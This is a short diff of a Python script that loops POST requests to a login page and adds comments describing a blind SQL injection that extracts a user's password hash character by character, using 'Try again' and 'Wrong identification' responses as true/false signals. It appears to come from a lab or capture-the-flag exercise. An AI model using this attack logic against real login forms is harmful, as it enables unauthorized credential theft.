@@ -14,6 +14,9 @@ while i <= 32 :
         response = requests.post(loginPage,data=parameters)
         # getting the html content from response object
         html =  response.text
+        # Check BlindSQLi Cases : 
+        # 1 - "Try again" case: is the false case for BlindSQLi (injected the wrong hash char, so we will skip this char) 
+        # 2 - In else case: the application will response with "Wrong identification", which means we used the correct username, and the injected char is used in user password hash , so we will save this char into a variable
         if (html.find("Try again..") != -1):
             #print("False Case")
             pass
